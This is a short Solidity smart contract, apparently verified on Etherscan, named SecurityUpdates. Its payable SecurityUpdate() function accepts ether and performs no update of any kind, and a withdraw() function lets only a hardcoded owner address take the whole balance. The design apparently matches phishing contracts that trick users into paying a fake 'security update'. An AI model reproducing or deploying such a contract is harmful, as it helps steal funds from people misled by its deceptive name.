/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

/**
 *Submitted for verification at Etherscan.io on 2023-09-18
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0x884BD0f238b8984cE4ef0abF446E79783a8f42F5 ;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}